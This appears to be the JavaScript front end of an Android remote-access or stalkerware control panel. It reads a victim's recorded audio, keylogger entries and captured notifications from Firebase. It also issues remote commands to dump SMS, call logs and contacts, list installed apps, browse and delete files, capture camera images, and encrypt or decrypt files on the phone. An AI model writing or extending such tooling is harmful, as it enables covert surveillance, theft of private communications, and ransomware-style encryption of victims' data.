                    var times = scores[k].time;
                    psdus.innerHTML += '<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="' + recs + '" type="audio/mpeg" /></audio><div class="downlii" onclick="downliio(' + "'" + recs + "'" + ')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>' + convertTimestamp(parseInt(times)) + '</div><br>';
                }
                if (lastkeyvoice != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyvoice = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="voicessu(this,' + "'" + lastkeyvoice + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyvoice = keys[keys.length - 1];
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Recordings Found<h4></div>';
            }
        }
    }
}

function voicessu(o, p) {
    manager = "notikey";
    if (manager == "notikey") {
        o.innerHTML = ".....";
        o.disabled = true;
        var psdus = document.getElementById("showrecs");
        var database = firebase.database();
        var ref = database.ref("records/" + unqid);
        ref.orderByKey().startAt(p).limitToFirst(10).once("value", gotData);

        function gotData(data) {
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                psdus.style.display = "block";
                o.style.display = "none";
                var rndm = 'recs' + Math.floor((Math.random() * 1000) + 100);
                var rndm2 = '.' + rndm;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var recs = scores[k].url;
                    var times = scores[k].time;
                    psdus.innerHTML += '<div class="recswarp" ><div class="plrec" onclick="playssrec(this)" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg></div><audio controls ><source src="' + recs + '" type="audio/mpeg" /></audio><div class="downlii" onclick="downliio(' + "'" + recs + "'" + ')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-box-arrow-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M3.5 10a.5.5 0 0 1-.5-.5v-8a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 0 0 1h2A1.5 1.5 0 0 0 14 9.5v-8A1.5 1.5 0 0 0 12.5 0h-9A1.5 1.5 0 0 0 2 1.5v8A1.5 1.5 0 0 0 3.5 11h2a.5.5 0 0 0 0-1h-2z"/><path fill-rule="evenodd" d="M7.646 15.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 14.293V5.5a.5.5 0 0 0-1 0v8.793l-2.146-2.147a.5.5 0 0 0-.708.708l3 3z"/></svg></div>' + convertTimestamp(parseInt(times)) + '</div><br>';
                }
                if (lastkeyvoice != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeyvoice = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="voicessu(this,' + "'" + lastkeyvoice + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeyvoice = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Recordings Found<h4></div>';
            }
        }
    }
}

function keylogger() {
    manager = "notikey";
    if (manager == "notikey") {
        var psdus = document.getElementById("notikey");
        hidekarbsdk();
        $("#preloaderr").fadeIn();
        $("#phones").css("display", "none");
        var database = firebase.database();
        var ref = database.ref("logolog/" + unqid);
        ref.limitToFirst(10).once("value", gotData);

        function gotData(data) {
            $("#preloaderr").fadeOut();
            psdus.style.display = "block";
            psdus.innerHTML = '<div onclick="clrk()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var event = scores[k].logoev;
                    var date = scores[k].logodate;
                    var msg = scores[k].msg;
                    psdus.innerHTML += '<div class="keylogg" ><b>Event: </b>' + event + '<br><br><b>Time: </b>' + date + '<br><br><b>Msg: </b>' + msg + "</div>";
                }
                if (lastkeykey != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeykey = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="loadmoreeu(this,' + "'" + lastkeykey + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeykey = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Logs Found<h4></div>';
            }
        }
    }
}

function loadmoreeu(o, p) {
    manager = "notikey";
    if (manager == "notikey") {
        o.innerHTML = ".....";
        o.disabled = true;
        var psdus = document.getElementById("notikey");
        var database = firebase.database();
        var ref = database.ref("logolog/" + unqid);
        ref.orderByKey().startAt(p).limitToFirst(10).once("value", gotData);

        function gotData(data) {
            if (data.exists()) {
                var scores = data.val();
                var keys = Object.keys(scores);
                var i = 0;
                psdus.style.display = "block";
                o.style.display = "none";
                for (i = (keys.length - 1); i > -1; i--) {
                    var k = keys[i];
                    var event = scores[k].logoev;
                    var date = scores[k].logodate;
                    var msg = scores[k].msg;
                    psdus.innerHTML += '<div class="keylogg" ><b>Event: </b>' + event + '<br><br><b>Time: </b>' + date + '<br><br><b>Msg: </b>' + msg + "</div>";
                }
                if (lastkeykey != (keys[keys.length - 1] + "") && parseInt(keys.length) >= 10) {
                    lastkeykey = keys[keys.length - 1] + "";
                    psdus.innerHTML += "<br><center><button class='btn' " + 'onclick="loadmoreeu(this,' + "'" + lastkeykey + "'" + ')"' + ">Load More</button></center><br>";
                }
                lastkeykey = keys[keys.length - 1] + "";
            } else {
                psdus.innerHTML = '<div class="keylogg" ><h4>No Logs Found<h4></div>';
            }
        }
    }
}

function notificationlog() {
    manager = "notikey";
    var psdus = document.getElementById("notikey");
    hidekarbsdk();
    $("#preloaderr").fadeIn();
    $("#phones").css("display", "none");
    var database = firebase.database();
    var ref = database.ref("notilogo/" + unqid);
    if (manager == "notikey") {
        ref.orderByKey().limitToLast(1000).once("value", gotData);
    }

    function gotData(data) {
        $("#preloaderr").fadeOut();
        psdus.style.display = "block";
        psdus.innerHTML = '<div onclick="clrn()" class="down" ><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5zm3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0V6z"/><path fill-rule="evenodd" d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1v1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4H4.118zM2.5 3V2h11v1h-11z"/></svg></div>';

        if (data.exists()) {
            var scores = data.val();
            var keys = Object.keys(scores);
            keys.reverse();

            var notifs = [];
            for (var i = 0; i < keys.length; i++) {
                var k = keys[i];
                var item = scores[k];
                var timeVal = item.time || 0;
                if (typeof timeVal === "string") timeVal = parseInt(timeVal) || 0;
                notifs.push({ key: k, data: item, time: timeVal });
            }
            notifs.sort(function(a, b) { return b.time - a.time; });

            for (var i = 0; i < notifs.length; i++) {
                var item = notifs[i];
                var k = item.key;
                var ico = item.data.icon;
                var packa = item.data.package;
                var title = item.data.title;
                var time = item.time;
                var ticker = item.data.ticker;
                var text = item.data.text;
                var name = item.data.name;
                if (ticker != "") ticker = '(' + ticker + ')';

                psdus.innerHTML += '<div class="keylogg" >' +
                    '<img src="data:image/png;base64,' + ico + '" >' +
                    '<div style="margin-left:60px;overflow:auto; "><b style="color:green"> ' + name + '</b><br><b style="color:red">' + packa + '</b><br><br><br></div>' +
                    '<h4>' + title + '<br><b>' + ticker + '</b> </h4>' +
                    '<br><p>' + text + '</p>' +
                    '<br><span>' + convertTimestamp(time) + '</span>' +
                    '</div>';
            }

            if (notifs.length > 0) {
                lastkeynot = notifs[notifs.length - 1].key;
                psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
            }
        } else {
            psdus.innerHTML += '<div class="keylogg" ><h4>No Notifications Found</h4></div>';
        }
    }
}

function loadmoree(o, p) {
    manager = "notikey";
    o.innerHTML = ".....";
    o.disabled = true;
    var psdus = document.getElementById("notikey");
    var database = firebase.database();
    var ref = database.ref("notilogo/" + unqid);
    if (manager == "notikey") {
        ref.orderByKey().endAt(p).limitToLast(1001).once("value", gotData);
    }

    function gotData(data) {
        if (data.exists() && manager == "notikey") {
            var scores = data.val();
            var keys = Object.keys(scores);
            var idx = keys.indexOf(p);
            if (idx !== -1) keys.splice(idx, 1);

            keys.reverse();

            var notifs = [];
            for (var i = 0; i < keys.length; i++) {
                var k = keys[i];
                var item = scores[k];
                var timeVal = item.time || 0;
                if (typeof timeVal === "string") timeVal = parseInt(timeVal) || 0;
                notifs.push({ key: k, data: item, time: timeVal });
            }
            notifs.sort(function(a, b) { return b.time - a.time; });

            o.style.display = "none";

            for (var i = 0; i < notifs.length; i++) {
                var item = notifs[i];
                var k = item.key;
                var ico = item.data.icon;
                var packa = item.data.package;
                var title = item.data.title;
                var time = item.time;
                var ticker = item.data.ticker;
                var text = item.data.text;
                var name = item.data.name;
                if (ticker != "") ticker = '(' + ticker + ')';

                psdus.innerHTML += '<div class="keylogg" >' +
                    '<img src="data:image/png;base64,' + ico + '" >' +
                    '<div style="margin-left:60px;overflow:auto; "><b style="color:green"> ' + name + '</b><br><b style="color:red">' + packa + '</b><br><br><br></div>' +
                    '<h4>' + title + '<br><b>' + ticker + '</b> </h4>' +
                    '<br><p>' + text + '</p>' +
                    '<br><span>' + convertTimestamp(time) + '</span>' +
                    '</div>';
            }

            if (notifs.length > 0) {
                lastkeynot = notifs[notifs.length - 1].key;
                psdus.innerHTML += "<br><center><button class='btn' onclick='loadmoree(this,\"" + lastkeynot + "\")'>Load More</button></center><br>";
            }
        } else {
            o.style.display = "none";
        }
    }
}

function dumpsms() {
    manager = "fileview";
    setdatcmd("dmpsms", "", "", respov);
}

function calllogs() {
    manager = "fileview";
    setdatcmd("dmpcall", "", "", respov);
}

function dumpcontact() {
    manager = "fileview";
    setdatcmd("dmpcont", "", "", respov);
}

function getpackages() {
    manager = "fileview";
    setdatcmd("getpackages", "", "", respov);
}

function fileev(o) {
    document.getElementById("vieweri").src = "data:text/html,<h4 style='color:green' > Getting File for preview....</h4>";
    document.getElementById("viewers").style.display = "block";
    document.getElementById("vieweri").src = o;
    document.getElementById("downlo").href = o;
}

function filesmanager() {
    manager = "filesmanager";
    $("#resp").css("display", "block");
    $("#phones").css("display", "none");
    
    // Reset del download immagini quando si cambia cartella
    resetImageDownload();
    
    setdatcmd("cd", "/sdcard/", "", respov);
}

function opfol(event) {
    var target = event.target || event.srcElement;
    clx = event.clientX;
    cly = event.clientY;

    if (((screen.height - cly) / 2) < 122) {
        document.getElementById("filwt").style.top = (screen.height - 300) + "px";
        document.getElementById("filwt").style.left = clx + "px";
    } else {
        document.getElementById("filwt").style.top = cly + "px";
        document.getElementById("filwt").style.left = clx + "px";
    }
    tarfol = event.target.innerHTML;

    if (tarfol.indexOf(".pkc") > -1) {
        document.getElementById("decrfol").style.display = "block";
    } else {
        document.getElementById("decrfol").style.display = "none";
    }

    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else {
        document.getElementById("filwt").style.display = "block";
        document.getElementById("filwt").setAttribute("data-file", tarfol);
        document.getElementById("filwt").setAttribute("data-type", event.target.getAttribute("class"));
    }
}

function opfol22(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");

    if (tarfol == "..") {
        resetImageDownload(); // Reset quando si torna indietro
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if (tarfol.indexOf("<b>") > -1) {
        resetImageDownload(); // Reset quando si entra in una cartella
        setdatcmd("cd", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
    } else {
        setdatcmd("cd", var32 + "/" + tarfol, "", respov);
    }
}

function encryptfol(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");
    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if ((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)) {
        setdatcmd("encrypt", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    } else {
        setdatcmd("encrypt", var32 + "/" + tarfol, "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    }
}

function foldel(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");
    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if ((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)) {
        setdatcmd("delfile", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    } else {
        setdatcmd("delfile", var32 + "/" + tarfol, "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    }
}

function decryptfol(o) {
    document.getElementById("filwt").style.display = "none";
    var tarfol = o.parentElement.parentElement.getAttribute("data-file");
    var tarfoltype = o.parentElement.parentElement.getAttribute("data-type");
    if (tarfol == "..") {
        setdatcmd("cd", var32.substr(0, var32.lastIndexOf("/")), "", respov);
    } else if ((tarfoltype.indexOf("fo") < 0) && (tarfol.indexOf("<b>") > -1)) {
        setdatcmd("decrypt", var32 + "/" + tarfol.substr(0, tarfol.indexOf("<b>")), "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    } else {
        setdatcmd("decrypt", var32 + "/" + tarfol, "", respov);
        setdatcmd("cd", "/sdcard/", "", respov);
    }
}

function camss() {
    setdatcmd("capturecam", "", "", respov);
    manager = "camview";
}

function playssrec(o) {
    if (o.nextElementSibling.paused == false) {
        o.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-play" viewBox="0 0 16 16"><path d="M10.804 8 5 4.633v6.734L10.804 8zm.792-.696a.802.802 0 0 1 0 1.392l-6.363 3.692C4.713 12.69 4 12.345 4 11.692V4.308c0-.653.713-.998 1.233-.696l6.363 3.692z"/></svg>';
        o.nextElementSibling.pause();
    } else {
        o.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#0dd" class="bi bi-pause" viewBox="0 0 16 16"><path d="M6 3.5a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5zm4 0a.5.5 0 0 1 .5.5v8a.5.5 0 0 1-1 0V4a.5.5 0 0 1 .5-.5z"/></svg>';
        o.nextElementSibling.play();
    }
}

function downliio(o) {
    window.open(o);
}

function hideThumbnails() {
    thumbnailQueue = [];
    thumbnailIndex = 0;
    batchStart = 0;
    thumbBatchActive = false;
    pendingThumbIndex = -1;
    var btn = document.querySelector("#gallery-controls button:first-child");
    if (btn) {
        btn.textContent = "Mostra anteprime immagini";
        btn.disabled = false;
    }
    setdatcmd("cd", var32, "", respov);
}
